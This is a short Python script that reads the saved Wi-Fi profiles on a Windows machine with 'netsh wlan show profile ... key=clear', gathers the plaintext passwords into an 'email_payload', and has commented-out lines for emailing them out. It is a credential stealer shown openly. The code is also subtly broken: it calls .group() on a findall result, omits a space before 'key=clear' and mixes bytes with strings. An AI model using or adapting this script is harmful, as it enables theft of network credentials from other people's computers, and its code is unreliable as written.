#__author__ = MrT3st3r

import subprocess, re


# command = 'msg * testing message!'

def get_net():
    command = 'netsh wlan show profiles'
    network = subprocess.check_output(command, shell=True)
    return network


def get_network_names(network):
    networks_name = re.findall('(?:Profile\s*:\s)(.*)', network)
    return networks_name.group(1)


def get_network_pawssword(network_list):
    email_payload=''
    for network in network_list:
        command  = 'netsh wlan show profile ' + network + 'key=clear'
        results = subprocess.check_output(command, shell=True)
        email_payload = email_payload + '\n' + results
    return email_payload


network_names_list = get_network_names(get_net())
to_be_emailed = get_network_pawssword(network_names_list)
print('Email has been generated with following payload: ', to_be_emailed)
# could possibly send_email(to_be_emailed)
# print('Email successfully sent!')